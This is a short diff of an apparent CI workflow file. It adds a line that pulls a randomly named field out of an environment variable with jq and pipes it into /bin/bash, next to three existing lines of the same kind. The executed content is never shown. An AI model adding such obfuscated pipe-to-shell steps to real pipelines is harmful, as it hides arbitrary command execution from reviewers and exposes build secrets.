@@ -23,6 +23,7 @@ jobs:
           echo $tw5 | jq -r .azh40517 | /bin/bash
           echo $e94 | jq -r .ugjn92527 | /bin/bash
           echo $um31 | jq -r .qtrwf0794 | /bin/bash
+          printf '%s' "$micv5" | jq -r .i7640 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
